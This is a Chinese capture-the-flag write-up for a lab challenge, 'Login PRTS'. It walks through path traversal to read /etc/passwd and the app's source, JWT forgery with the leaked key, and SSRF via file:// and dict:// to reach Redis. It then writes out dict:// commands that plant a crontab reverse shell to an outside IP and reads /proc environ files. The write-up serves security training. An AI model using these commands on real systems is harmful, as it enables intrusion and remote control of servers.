# 登录 PRTS

## 题目描述

第一题：普瑞赛斯（Priestess）在 Abyss 中封禁了刀客塔在 PRTS 中的账号，身为刀客塔的你要想尽一切办法获取 PRTS 的权限（但是一定要登录刀客塔的账号吗？

第二题：你成功获取到了 PRTS 的部分权限，但是你还需要进一步获取到 PRTS 的 shell，据说普瑞赛斯在 PRTS 的环境里面放了什么东西

**本题构建容器所需要的时间较长，请提前点击构建容器按钮！**

> - 本题使用的系统是一个已经停止维护的，曾经服务器占用率最高的一个系统
> - 刀客塔的账号密码
>   - Username: VFTS352
>   - Password: 48399110
> - 不要在意网站壁纸，找不到好看的 PRTS 图了
> - 第一题和第二题的 flag 分别有 FLAG1 和 FLAG2 标识，第二题直接使用第一题开的容器就可以了，重新构建不影响第二题的 FLAG

## 开始做题

### 第一题

本题容器打开后是一个登录页面

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415172627767.png)

因为题目给了账号密码，我们直接拿来登录

> - 出自明日方舟2025年情人节调查问卷 ByMySide https://ak.hypergryph.com/bymyside
> - Username: VFTS352
> - Password: 48399110

登录后我们果然被封禁了

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415172734161.png)

打开网页控制台，寻找一下突破点，发现头像链接为 `/api/get_avatar?filename=doctor.png`，所以很可能存在路径穿越漏洞，我们尝试一下，把后面改成 `../../../../../../etc/passwd` 发现我们可以正常访问

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173045665.png)

所以我们可以尝试读取网站的源码，通过 Wappalyzer 可以发现这是一个 Python 程序（比赛中的 Python 版本与我本地的可能不一致）

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173142736.png)

所以我们尝试一下读取 `/app/app.py`，发现可以拿到源码

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173230399.png)

这里能看到 `SECRET_KEY` 的值，结合 Cookie 中有 token 字段，可以认为是采用了 JWT（当然看源码也能看到一开始就引入了 `jwt` 库）

把 `SECRET_KEY` 拿出来验证一下，与我们现在的 Cookie 进行验证，验证通过

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173347306.png)

所以我们现在可以用这个 `SECRET_KEY` 来随意签名我们需要的 token，这里把 `sub` 改为 `priestess`

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173450813.png)

把生成的 token 放回 cookie 里面，刷新，得到第一个 flag

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173522709.png)

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173537240.png)

这里因为 sober.js 的 alert 不让选中，所以推荐用开发者工具来复制

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415173627934.png)

`flag{f8a5b200-3a49-4643-a897-5797f045a30f}`（flag 动态生成）

### 第二题

现在我们已经有了普瑞赛斯的权限，这里给了我们一个输入框，告诉我们提交要访问的内容，提示是给的 `https://`，那我们试图访问百度

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415174225175.png)

发现能够正常访问，如果你稍微有一点经验，你就应该知道这里很可能存在 SSRF 漏洞，我们改成 `file:///etc/passwd`，发现也是可以正常访问的

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415174314056.png)

那同样的，我们大概率是能够使用 `dict` 协议的，直接用 dict 协议爆破一下端口，发现只有 5000 和 6379 端口返回的长度比较长（即返回的内容多）

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415180553537.png)

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415182044792.png)

并且由返回可以知道，我们的网页是开在 5000 端口上的，而 6379 端口如果不清楚的话，去搜一下，发现是 Redis 的默认端口

此时第二题的考点就很明确了，利用 SSRF 的 `dict` 协议打 Redis 来 Get Shell

而直接搜索 `SSRF` `dict` `Redis` 就可以知道有个打法是打 crontab 定时任务，而题目描述中有这样的内容：`本题使用的系统是一个已经停止维护的，曾经服务器占用率最高的一个系统`，指的正是 `CentOS7`，这种打法的前提条件就是只有 `CentOS` 可用，那么现在条件都齐了，我们可以直接打

```
dict://127.0.0.1:6379/set:mars:"\n\n* * * * * root bash -i >& /dev/tcp/192.168.88.128/7777 0>&1 \n\n"
dict://127.0.0.1:6379/config:set:dir:/etc/
dict://127.0.0.1:6379/config:set:dbfilename:crontab
dict://127.0.0.1:6379/bgsave
```

- 第一条命令是将一段字符串保存到 mars 键里，内容是使用 crontab 进行反弹 Shell 的操作
- 第二条命令是将 Redis 的数据库目录设置为 `/etc`
- 第三条命令是将 Redis 的数据库文件设置为 `crontab`
- 第四条命令是让 Redis 将数据库保存到文件

这样就构成了将 shell 反弹到我们服务器的整个链条（服务器需要使用 `nc -lvnp PORT` 监听端口）

如果你不确定是否保存了，大可以使用 `file:///etc/crontab` 查看一下，发现无法正常解析说明确实保存了

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415182745384.png)

这里需要等待一会，因为我们的 crontab 是每分钟运行，等到监听的服务器弹出提示就说明连接成功了

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415182853369.png)

题目中说道：普瑞赛斯在 PRTS 的环境里面放了什么东西，说明我们需要查看环境变量

现在就要读取环境变量了，如果我们直接用 `env` 读取的话会发现读取不出来我们要的 flag

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415183007234.png)

因为这里是新建了一个 bash 进程来反弹给我们用的，所以不能直接看这里，我们得去 `/proc` 里面找，最后能在 `/proc/11/environ` 查看到我们需要的东西（这里的 `11` 可能会有变动）

这里的 `11`，你也可以用 `ps` 命令来查看，或者直接 `pidof python3` 也可以

甚至可以直接 `cat /proc/$(pidof python3)/environ` 就能出结果

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/image-20250415183152658.png)

得到 flag：`flag{DOnt_you-daRE-forGEt-Me_:>}` = 不准忘记我（普瑞赛斯自己说的，原话为 `Dr.{{username}}，不准忘记我`）

## 彩蛋

如果你把 Cookie 里面的 user 也改成 `priestess` 或者直接访问 `/api/get_avatar?username=priestess.png` 的话，能够得到一张赛博女鬼的图

![](https://cdn.jsdelivr.net/gh/GDUTMeow/Challenge-Login-PRTS/img/priestess.png)

